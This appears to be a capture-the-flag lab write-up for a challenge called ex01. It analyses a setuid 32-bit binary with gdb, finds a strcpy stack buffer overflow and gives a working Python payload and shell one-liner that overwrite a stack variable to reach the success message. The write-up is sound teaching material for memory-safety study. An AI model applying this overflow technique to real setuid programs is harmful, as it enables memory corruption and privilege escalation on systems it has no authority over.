## ex01

### Objective
The goal of this challenge is to modify a specific variable in the binary and see the message "you have correctly got the variable to the right value".

### Steps Taken

1. **Initial Analysis**:
    - First, we used `file` to determine the type of the binary and `strings` to identify useful strings within the binary.

    ```sh
    file bin
    strings bin
    ```

    **Output of `file bin`**:
    ```
    bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=05192c075e2384bc94402b41f639965cc9fb9c87, not stripped
    ```

    **Output of `strings bin`**:
    ```
    /lib/ld-linux.so.2
    __gmon_start__
    libc.so.6
    _IO_stdin_used
    strcpy
    puts
    printf
    errx
    __libc_start_main
    GLIBC_2.0
    PTRh
    QVhd
    D$\=dcbau
    [^_]
    please specify an argument
    you have correctly got the variable to the right value
    Try again, you got 0x%08x
    ```

2. **Disassembly**:
    - We used `gdb` to disassemble the binary and identify the `strcpy` function call, which is vulnerable to buffer overflow.

    ```sh
    gdb bin
    (gdb) break main
    (gdb) run
    (gdb) disassemble main
    ```

    **Disassembly of `main`**:
    ```assembly
    Dump of assembler code for function main:
       0x08048464 <+0>:     push   %ebp
       0x08048465 <+1>:     mov    %esp,%ebp
       0x08048467 <+3>:     and    $0xfffffff0,%esp
       0x0804846a <+6>:     sub    $0x60,%esp
    => 0x0804846d <+9>:     int3   
       0x0804846e <+10>:    jge    0x8048478 <main+20>
       0x08048470 <+12>:    add    %esi,0x14(%ebp)
       0x08048473 <+15>:    movl   $0x80485a0,0x4(%esp)
       0x0804847b <+23>:    movl   $0x1,(%esp)
       0x08048482 <+30>:    call   0x8048388 <errx@plt>
       0x08048487 <+35>:    movl   $0x0,0x5c(%esp)
       0x0804848f <+43>:    mov    0xc(%ebp),%eax
       0x08048492 <+46>:    add    $0x4,%eax
       0x08048495 <+49>:    mov    (%eax),%eax
       0x08048497 <+51>:    mov    %eax,0x4(%esp)
       0x0804849b <+55>:    lea    0x1c(%esp),%eax
       0x0804849f <+59>:    mov    %eax,(%esp)
       0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>
       0x080484a7 <+67>:    mov    0x5c(%esp),%eax
       0x080484ab <+71>:    cmp    $0x61626364,%eax
       0x080484b0 <+76>:    jne    0x80484c0 <main+92>
       0x080484b2 <+78>:    movl   $0x80485bc,(%esp)
       0x080484b9 <+85>:    call   0x8048398 <puts@plt>
       0x080484be <+90>:    jmp    0x80484d5 <main+113>
       0x080484c0 <+92>:    mov    0x5c(%esp),%edx
       0x080484c4 <+96>:    mov    $0x80485f3,%eax
       0x080484c9 <+101>:   mov    %edx,0x4(%esp)
       0x080484cd <+105>:   mov    %eax,(%esp)
       0x080484d0 <+108>:   call   0x8048378 <printf@plt>
       0x080484d5 <+113>:   leave  
       0x080484d6 <+114>:   ret    
    End of assembler dump.
    ```

    - We identified the following key points in the disassembly:
      - The `strcpy` function is called at offset `+62` with the destination buffer located at `0x1c(%esp)` and the source string located at `0x4(%esp)`.
      - There is a comparison at offset `+71` to check if a specific value (`0x61626364`, which is ASCII for "abcd") is present in the variable located at `0x5c(%esp)`.
      - The success message is displayed if this comparison is true, as shown by the call to `puts` with the message address `0x80485bc`.

3. **Determine Buffer Size and Offset**:
    - The destination buffer for `strcpy` starts at `0x1c(%esp)`.
    - The target value to set is located at `0x5c(%esp)`.
    - The offset from the start of the buffer to the target value is `0x5c - 0x1c = 0x40` (64 bytes).

4. **Craft the Payload**:
    - We created a Python script to generate the payload that overflows the buffer and modifies the target variable.

    ```python
    import struct

    buffer_size = 64  # 0x40 in hex
    target_value = 0x61626364  # "abcd" in ASCII

    payload = b'A' * buffer_size
    payload += struct.pack("<I", target_value)

    # Print the payload
    print(payload.decode('latin-1'))
    ```

5. **Execute the Binary with the Payload**:
    - We used the following command to run the binary with the crafted payload as a command-line argument.

    ```sh
    ./bin $(python -c 'import struct; buffer_size = 64; target_value = 0x61626364; payload = b"A" * buffer_size + struct.pack("<I", target_value); print(payload.decode("latin-1"))')
    ```

### Output
- The output showed the success message, indicating that we successfully exploited the binary:
    ```
    you have correctly got the variable to the right value
    ```

### Tools Used
- `file`
- `strings`
- `gdb`
- Python

### Educational Purpose
These methods and tools are used strictly for educational purposes to understand and protect against similar vulnerabilities. 

### Script
Include the Python script used to generate the payload:

```python
import struct


buffer_size = 64  # 0x40 in hex
target_value = 0x61626364  # "abcd" in ASCII

payload = b'A' * buffer_size
payload += struct.pack("<I", target_value)

# Print the payload
print(payload.decode('latin-1'))
```